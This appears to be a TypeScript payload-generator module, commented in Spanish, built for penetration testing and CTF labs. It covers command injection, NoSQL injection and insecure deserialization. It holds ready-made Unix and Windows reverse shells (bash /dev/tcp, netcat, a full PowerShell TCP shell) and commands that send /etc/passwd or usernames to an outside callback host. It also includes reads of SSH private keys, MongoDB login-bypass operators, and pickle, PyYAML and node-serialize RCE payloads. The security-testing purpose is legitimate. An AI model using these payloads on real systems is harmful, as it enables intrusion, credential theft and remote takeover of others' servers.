/* Command Injection, NoSQLi e Insecure Deserialization — generadores de
   payloads por contexto y objetivo con su detección. 100% local. */

/* ─── Command Injection ─── */

export type CmdCtx = 'unix' | 'windows'
export type CmdGoal = 'ejecución simple' | 'output en la respuesta' | 'cega (time-based)' | 'cega (OOB/DNS)' | 'lectura de fichero' | 'reverse shell de lab'

export interface CmdPayload {
  cmd: string
  ctx: CmdCtx
  goal: CmdGoal
  sep: string
  why: string
  detect: string
}

const cmdUnixPayloads: Record<CmdGoal, { sep: string; cmd: string; why: string; detect: string }[]> = {
  'ejecución simple': [
    { sep: ';', cmd: 'id', why: 'El separador más simple: si el backend concatena input → shell, id se ejecuta y suele imprimir uid= en la respuesta.', detect: 'Aparece uid=33(www-data) o similar en la respuesta.' },
    { sep: '|', cmd: 'id', why: 'Pipe: la salida del comando legítimo alimenta el tuyo. Funciona incluso si el binario original no permite ;.', detect: 'uid= en la respuesta o en el error del binario original.' },
    { sep: '$()', cmd: 'id', why: 'Sustitución de comando: se ejecuta DENTRO del argumento, sin separador. Pasa filtros que solo bloquean ; | &.', detect: 'uid= incrustado donde debería ir el valor del parámetro.' },
    { sep: '` `', cmd: 'id', why: 'Backticks equivalentes a $() para shells POSIX. Cuando $() está filtrado, esto suele pasar.', detect: 'uid= en la respuesta.' },
    { sep: '\n', cmd: 'id', why: 'Salto de línea: httpd/proxies a veces lo codifican, pero una exec directa lo interpreta como nuevo comando.', detect: 'uid= en la respuesta o en logs del servidor.' },
  ],
  'output en la respuesta': [
    { sep: ';', cmd: 'cat /etc/passwd', why: 'El fichero más universal para ver si la salida refluye: cualquier unix tiene /etc/passwd y es legible.', detect: 'Aparece root:x:0:0: en la respuesta.' },
    { sep: '|', cmd: 'head -c 200 /proc/self/environ', why: 'Variables de entorno del proceso: a veces contienen secretos y confirma reflejo de salida.', detect: 'PATH= o LANG= en la respuesta.' },
    { sep: ';', cmd: 'ls -la', why: 'Listado del directorio de trabajo: contexto inmediato sin leer nada sensible aún.', detect: 'Aparece total o nombres de ficheros del directorio.' },
  ],
  'cega (time-based)': [
    { sep: ';', cmd: 'sleep 5', why: 'Si la respuesta tarda ~5s, hay ejecución aunque no refluya nada. Cambia a 10s para confirmar y descartar latencia de red.', detect: 'Diferencia de tiempo medible en la respuesta (usa 2 valores: 3s y 9s).' },
    { sep: '|', cmd: 'sleep 5', why: 'Pipe con sleep: útil cuando el punto de inyección no acepta ;.', detect: 'Respuesta retrasada ~5s de forma reproducible.' },
    { sep: '&&', cmd: 'sleep 5', why: 'AND condicional: solo si el primer comando tiene éxito. Sirve para inferir condiciones (si existe fichero, sleep).', detect: 'Retardo SOLO cuando la condición se cumple: eso convierte la ceguera en oráculo.' },
  ],
  'cega (OOB/DNS)': [
    { sep: '` `', cmd: 'curl http://TU-DNS.burpcollaborator.net', why: 'OOB por HTTP: la resolución DNS del subdominio único ya confirma ejecución sin respuesta HTTP.', detect: 'Consulta DNS en tu Collaborator/interactsh con el subdominio exacto.' },
    { sep: ';', cmd: 'nslookup $(whoami).TU-DNS.burpcollaborator.net', why: 'Exfiltra datos por DNS: el nombre del usuario sale como subdominio. Funciona con firewall egress estricto si el DNS interno sale.', detect: 'Registro DNS con whoami embebido.' },
    { sep: '$()', cmd: 'curl --data @/etc/passwd http://TU-DNS.burpcollaborator.net', why: 'Exfiltración completa de fichero por POST cuando el DNS interno está restringido.', detect: 'Body con el contenido del fichero en tu servidor OOB.' },
  ],
  'lectura de fichero': [
    { sep: ';', cmd: 'cat /etc/shadow 2>/dev/null', why: 'Solo como root — casi siempre falla; sirve para medir privilegios del servicio.', detect: 'Si sale, el servicio corre como root (crítico).' },
    { sep: ';', cmd: 'cat ~/.ssh/id_rsa', why: 'Clave privada del usuario del servicio: pivote inmediato a otros equipos.', detect: '-----BEGIN OPENSSH PRIVATE KEY----- en la respuesta.' },
    { sep: '|', cmd: 'base64 /flag.txt', why: 'base64 evita que el output-parser trocee binarios o personajes raros; útil en CTFs con flag.', detect: 'Cadena base64 descodificable con la flag.' },
  ],
  'reverse shell de lab': [
    { sep: ';', cmd: 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1', why: 'Reverse shell bash puro: sin nc. Solo funciona si bash está y el egress lo permite.', detect: 'Conexión entrante en tu listener de laboratorio.' },
    { sep: ';', cmd: 'nc -e /bin/bash ATTACKER 4444', why: 'Clásico con netcat tradicional (no el openbsd sin -e).', detect: 'Shell en el listener.' },
    { sep: ';', cmd: 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f', why: 'Versión para netcat OpenBSD sin -e: FIFO como tubo bidireccional.', detect: 'Shell en el listener.' },
  ],
}

const cmdWinPayloads: Record<CmdGoal, { sep: string; cmd: string; why: string; detect: string }[]> = {
  'ejecución simple': [
    { sep: '&', cmd: 'whoami', why: 'Separador por defecto de cmd.exe: whoami confirma ejecución con dominio y usuario.', detect: 'Aparece equipo\\usuario en la respuesta.' },
    { sep: '&&', cmd: 'whoami', why: 'AND: solo si el comando original tiene éxito. Útil para inferir condiciones.', detect: 'equipo\\usuario en la respuesta.' },
    { sep: '|', cmd: 'whoami', why: 'Pipe: útil cuando & está filtrado por el WAF.', detect: 'equipo\\usuario en la respuesta.' },
  ],
  'output en la respuesta': [
    { sep: '&', cmd: 'type C:\\Windows\\win.ini', why: 'win.ini es el canario universal de Windows: existe en todo sistema y no lo toca nadie.', detect: '[fonts] o [extensions] en la respuesta.' },
    { sep: '&', cmd: 'dir C:\\', why: 'Listado raíz: contexto sin leer nada sensible todavía.', detect: 'Directorio de C:\\ en la respuesta.' },
    { sep: '&', cmd: 'echo %USERNAME%', why: 'Variable de entorno del usuario del servicio: confirma reflejo y contexto.', detect: 'Nombre de usuario en la respuesta.' },
  ],
  'cega (time-based)': [
    { sep: '&', cmd: 'timeout /t 5', why: 'Equivalente Windows de sleep: si tarda ~5s, hay ejecución.', detect: 'Retardo reproducible.' },
    { sep: '&', cmd: 'ping -n 6 127.0.0.1', why: 'Ping como sleep alternativa: un paquete por segundo, 6 = 5s.', detect: 'Retardo reproducible.' },
  ],
  'cega (OOB/DNS)': [
    { sep: '&', cmd: 'nslookup %USERNAME%.TU-DNS.burpcollaborator.net', why: 'OOB con exfil del usuario en el subdominio: ni siquiera necesita HTTP de salida.', detect: 'DNS en tu Collaborator con el usuario embebido.' },
    { sep: '&', cmd: 'certutil -urlcache -f http://TU-DNS.burpcollaborator.net/x C:\\Windows\\Temp\\x', why: 'Certutil como downloader nativo: confirma egress HTTP completo.', detect: 'Petición HTTP en tu servidor OOB.' },
  ],
  'lectura de fichero': [
    { sep: '&', cmd: 'type C:\\Users\\Administrator\\Desktop\\flag.txt', why: 'Lectura directa de la flag en CTFs de Windows.', detect: 'Contenido en la respuesta.' },
    { sep: '&', cmd: 'type C:\\Windows\\System32\\drivers\\etc\\hosts', why: 'El /etc/hosts de Windows: revela entornos internos y hosts mapeados.', detect: 'Copyright + lista de hosts.' },
  ],
  'reverse shell de lab': [
    { sep: '&', cmd: 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'ATTACKER\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$c.Receive($b)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=(New-Object Text.ASCIIEncoding).GetBytes($r+\'PS>\');$s.Write($t,0,$t.Length)}"', why: 'Reverse shell PowerShell: sin fichero en disco, solo memoria. El más usado en labs Windows.', detect: 'Shell en tu listener de laboratorio.' },
    { sep: '&', cmd: 'mshta.exe \\TATTACKER\\share\\payload.hta', why: 'LOLBAS mshta desde UNC de tu lab: ejecuta la .hta sin tocar disco local ni policies de PowerShell.', detect: 'Proceso mshta.exe hijo + SMB/HTTP hacia tu servidor y conexión del payload.' },
  ],
}

export const cmdPayloads = (ctx: CmdCtx, goal: CmdGoal): CmdPayload[] => {
  const src = ctx === 'unix' ? cmdUnixPayloads[goal] : cmdWinPayloads[goal]
  return src.map((p) => ({ ...p, ctx, goal }))
}

/* ─── NoSQL injection ─── */

export interface NoSqlPayload {
  name: string
  field: string
  value: string
  json: string
  url: string
  why: string
  detect: string
  db: 'Mongo' | 'genérico'
}

const nosqlBase: Omit<NoSqlPayload, 'db' | 'json' | 'url'>[] = [
  {
    name: '$ne — login sin contraseña',
    field: 'password',
    value: '{"$ne": null}',
    why: 'El operador $ne compara "distinto de null": pasa con CUALQUIER contraseña menos vacía. El login compara objeto vs objeto y entra.',
    detect: 'Login exitoso con contraseña inventada: respuesta 200 con token/cookie de sesión.',
  },
  {
    name: '$gt — siempre mayor',
    field: 'password',
    value: '{"$gt": ""}',
    why: '$gt con cadena vacía: toda cadena no vacía es mayor. Equivalente a $ne pero con operador distinto por si lo filtran.',
    detect: 'Login exitoso con contraseña inventada.',
  },
  {
    name: '$regex — extracción carácter a carácter',
    field: 'password',
    value: '{"$regex": "^a"}',
    why: 'Con $regex mides prefijos: si "^a" entra y "^b" no, la contraseña empieza por a. Automatizable con un script de 30 líneas.',
    detect: 'Respuesta diferencial (éxito/fallo) según el prefijo probado: contraseña extraíble sin romper el hash.',
  },
  {
    name: '$where — JS en el servidor',
    field: '__raw',
    value: '{"$where": "sleep(5000) || true"}',
    why: '$where ejecuta JavaScript dentro de mongod. sleep confirma inyección; `this.password` en el cuerpo da extracción total. Muchas instancias lo tienen deshabilitado.',
    detect: 'Retardo de ~5s en la respuesta = ejecución JS confirmada.',
  },
  {
    name: '$exists — enumeración de campos',
    field: 'password',
    value: '{"$exists": true}',
    why: 'Filtra documentos que TIENEN el campo: oráculo para saber si un usuario tiene 2FA, API keys o campos ocultos.',
    detect: 'Respuesta solo para usuarios con ese campo: enumeración de estructura de datos.',
  },
  {
    name: 'Array smuggling (POST urlencoded)',
    field: 'password',
    value: '[$ne]=invalid',
    why: 'En PHP/Rack/Express con body urlencoded, password[$ne]=invalid llega como objeto {password: {$ne: "invalid"}} aunque el código espere string.',
    detect: 'Login exitoso: el driver recibe objeto donde el código esperaba string.',
  },
  {
    name: '$not — negación de patrón',
    field: 'password',
    value: '{"$not": {"$regex": "^."}}',
    why: 'Invierte cualquier condición: "$not regex ^." coincide con cadena vacía. Útil si filtran $ne/$gt.',
    detect: 'Login exitoso con cadena vacía.',
  },
  {
    name: '$in con lista',
    field: 'password',
    value: '{"$in": ["", "x", "admin"]}',
    why: '$in acepta array de candidatos: prueba 3 valores en una petición. Sirve para brute force de campos cortos (PINs).',
    detect: 'Login exitoso con alguno de los valores del array.',
  },
]

export const nosqlPayloads = (baseUrl: string, paramUser = 'user', paramPass = 'password'): NoSqlPayload[] =>
  nosqlBase.map((p) => {
    const params = `${paramUser}=${encodeURIComponent('admin')}&${paramPass}=${encodeURIComponent(p.value)}`
    const json = JSON.stringify({ [paramUser]: 'admin', [paramPass]: safeParse(p.value) }, null, 2)
    return { ...p, db: p.value.includes('$where') ? 'Mongo' : 'genérico', json, url: `${baseUrl || 'https://target.com/login'}?${params}` }
  })

const safeParse = (v: string): unknown => {
  try { return JSON.parse(v) } catch { return v }
}

/* ─── Insecure Deserialization ─── */

export type DeserLang = 'php' | 'python' | 'java' | 'dotnet' | 'node'

export interface DeserPayload {
  lang: DeserLang
  name: string
  gadget: string
  payload: string
  why: string
  detect: string
  severity: 'crítica' | 'alta'
}

const b64 = (s: string): string => {
  // btoa universal para node (test) y browser
  if (typeof btoa === 'function') return btoa(s)
  return Buffer.from(s, 'binary').toString('base64')
}

export const deserPayloads = (callbackUrl: string): DeserPayload[] => {
  const cb = callbackUrl || 'http://TU-SERVIDOR.burpcollaborator.net'
  return [
    {
      lang: 'php',
      name: 'unserialize → POP chain básica',
      gadget: 'Objetos PHP con __destruct/__wakeup',
      payload: 'O:8:"Skeleton":1:{s:4:"file";s:11:"/etc/passwd";}',
      why: 'unserialize() sobre input de usuario reconstruye objetos SIN pasar por el constructor y dispara magic methods. Un gadget con file_get_contents en __destruct lee ficheros; con system, ejecuta.',
      detect: 'Contenido del fichero en la respuesta, o error de clase no encontrada que delata que unserialize corrió.',
      severity: 'crítica',
    },
    {
      lang: 'php',
      name: 'PHPGGC genérica (RCE)',
      gadget: 'Monolog/RCE1 (y cadenas similares)',
      payload: `O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"formatter";O:31:"Monolog\\Formatter\\GelfFormatter":0:{}}`,
      why: 'Las cadenas de gadgets reales (PHPGGC) encadenan 2-3 clases de librerías instaladas: el exploit no crea nada nuevo, REUTILIZA código legítimo del target.',
      detect: 'DNS/HTTP a tu servidor OOB o RCE directa según la cadena.',
      severity: 'crítica',
    },
    {
      lang: 'python',
      name: 'pickle RCE',
      gadget: '__reduce__ de cualquier clase',
      payload: b64(`cos\nsystem\n(S'curl ${cb}'\ntR.`),
      why: 'pickle reconstruye objetos ejecutando lo que el pickle diga: __reduce__ es ejecución de código por diseño, no un bug. Si un pickle llega del usuario, es RCE directa.',
      detect: 'Petición a tu callback o error del pickle delatando la versión de Python.',
      severity: 'crítica',
    },
    {
      lang: 'python',
      name: 'PyYAML unsafe load',
      gadget: 'yaml.load() sin Loader seguro',
      payload: `!!python/object/apply:os.system ["curl ${cb}"]`,
      why: 'yaml.load() clásico (no safe_load) soporta tags python/object/apply: ejecución directa. Distingue aplicaciones Flask/Django viejas de las modernas.',
      detect: 'Petición OOB o 500 con traceback mencionando yaml.',
      severity: 'crítica',
    },
    {
      lang: 'java',
      name: 'Java native serialization probe',
      gadget: 'CommonsCollections / ysoserial (concepto)',
      payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hw' + b64('probe'),
      why: 'El magic ac ed 00 05 delata serialización nativa de Java. Las cadenas ysoserial (CommonsCollections, CommonsBeanutils) transforman eso en RCE si las librerías están en el classpath.',
      detect: 'InvalidClassException/ClassCastException que confirma que el endpoint deserializa: luego eliges el gadget por librerías visibles.',
      severity: 'crítica',
    },
    {
      lang: 'dotnet',
      name: 'ViewState sin MAC validation',
      gadget: 'LosFormatter / ObjectStateFormatter',
      payload: '/wEPDwUKMTI0MjM0NTY3OA== (ViewState viejo sin machineKey)',
      why: 'Si validationKey no está definido (machineKey por defecto en farms mal configuradas), el ViewState se firma con claves conocidas: ysoserial.net lo convierte en RCE.',
      detect: 'ViewState decodificable sin error de MAC: el servidor acepta objetos firmados con claves predecibles.',
      severity: 'crítica',
    },
    {
      lang: 'node',
      name: 'node-serialize IIFE',
      gadget: '_$$ND_FUNC$$_ function + ()()',
      payload: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl ${cb}', function(){}); }()"}`,
      why: 'node-serialize evalúa funciones serializadas: el truco IIFE ()() hace que se ejecute al deserializar. Librería vieja pero aparece en CTFs y apps legacy.',
      detect: 'Petición a tu callback desde el servidor objetivo.',
      severity: 'alta',
    },
  ]
}
